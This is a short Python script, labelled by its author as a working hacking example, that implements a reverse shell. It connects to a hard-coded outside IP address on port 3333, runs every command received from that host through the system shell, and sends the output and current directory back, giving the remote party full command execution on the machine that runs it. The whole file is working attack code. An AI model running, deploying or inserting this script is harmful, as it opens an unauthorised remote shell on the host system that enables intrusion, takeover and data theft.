# WORKS. SINGLE CONNCETION. SENDING AND REEIVING EXAMPLE. HACKING EXAMPLE.  METHOD CALLED REVERSE SHELL.

import socket
import os
import subprocess

s =socket.socket()
host  ="159.89.167.170"
port = 3333

s.connect((host,port))


while True:
    received_data = s.recv(1024)   # representating the chunks in which data is sent, mostly for large data

    if received_data[:2].decode("utf-8") =="cd":
        os.chdir(received_data[3:].decode("utf-8"))
        print("------------ DIRECTORY CHANGED -------------")
        print(f"to {os.getcwd()}")

    if len(received_data) > 0:
        commands = subprocess.Popen(received_data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr= subprocess.PIPE)
        output_byte = commands.stdout.read() + commands.stderr.read()
        output_str = str(output_byte,"utf-8")

        pid = os.getcwd() + ">>> "  # present working directory

        s.send(str.encode(output_str + pid))
        print(output_str)




